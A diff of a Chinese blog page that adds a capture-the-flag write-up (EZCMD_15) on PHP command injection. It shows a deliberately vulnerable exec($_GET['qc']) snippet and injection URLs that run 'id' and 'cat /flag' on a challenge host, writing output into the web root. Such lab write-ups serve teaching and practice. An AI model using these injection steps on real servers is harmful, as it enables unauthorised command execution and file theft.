@@ -349,6 +349,7 @@
         <li><a href="#ezcmd_13">EZCMD_13</a></li>
         <li><a href="#ezcmd_14">EZCMD_14</a></li>
         <li><a href="#ezcmd_15">EZCMD_15</a></li>
+        <li><a href="#ezcmd_16">EZCMD_16</a></li>
       </ol>
     </li>
   </ol>
@@ -478,7 +479,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 12 分钟
+                    阅读时长: 13 分钟
                 </time>
             </div>
         
@@ -495,7 +496,7 @@
 
 
 
-                <span class="article-time--wordcount">5612 字</span>
+                <span class="article-time--wordcount">6070 字</span>
             </div>
         
     </footer>
@@ -2463,7 +2464,76 @@ PHP 支持字符串按位异或，因此可以只用符号拼出字母。比如�
 	
 ></p>
 <h3 id="ezcmd_15">EZCMD_15
-</h3><p>OK看到这里,此章就到此结束了,我们下一篇再见,各位佬</p>
+</h3><p>访问首页 源码展示</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">error_reporting(0);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if (isset($_GET[&#39;qc&#39;])) {
+</span></span><span class="line"><span class="cl">    exec($_GET[&#39;qc&#39;]);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看到这里基本就已经确定思路了。程序会先用 highlight_file(<strong>FILE</strong>) 把当前文件源码输出出来，然后判断是否存在 qc 参数；如果存在，就直接把 $_GET[&lsquo;qc&rsquo;] 送进 exec() 执行。整个过程没有任何过滤，也没有白名单限制<br>
+不过这里有一个小细节需要注意：exec() 和 system() 不一样，它默认不会把命令执行结果直接回显到页面上，所以即使命令成功执行，页面看起来也还是源码。这种情况下，最简单的办法就是把命令输出重定向到 Web 目录下的文件里，再通过浏览器访问这个文件读取结果<br>
+首先可以用一条简单命令验证是否真的能够执行系统命令，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">docker</span><span class="o">.</span><span class="n">qingcen</span><span class="o">.</span><span class="n">net</span><span class="p">:</span><span class="mi">30911</span><span class="o">/</span><span class="err">?</span><span class="n">qc</span><span class="o">=</span><span class="n">id</span><span class="o">&gt;/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="mf">1.</span><span class="n">txt</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的意思是执行 id，然后把输出写入 /var/www/html/1.txt。接着访问：http://docker.qingcen.net:30911/1.txt<br>
+<img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780453649814_cmd15_1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="cmd15_1.png"
+	
+	
+><br>
+这说明命令执行已经成功，并且当前 Web 服务权限为 www-data,接下来就是读取 flag。常见情况下 flag 会放在根目录 /flag，所以直接执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">docker</span><span class="o">.</span><span class="n">qingcen</span><span class="o">.</span><span class="n">net</span><span class="p">:</span><span class="mi">30911</span><span class="o">/</span><span class="err">?</span><span class="n">qc</span><span class="o">=</span><span class="n">cat</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">flag</span><span class="o">&gt;/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">f1</span><span class="o">.</span><span class="n">txt</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的 %20 是空格的 URL 编码。命令会把 /flag 的内容写入 /var/www/html/f1.txt。然后访问：
+<img src="https://cloudflare-imgbed.3285433461.workers.dev/file/1780453747546_cmd15_2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="cmd15_2.png"
+	
+	
+></p>
+<h3 id="ezcmd_16">EZCMD_16
+</h3><p>访问首页
+OK看到这里,此章就到此结束了,我们下一篇再见,各位佬</p>
 
 </section>
 
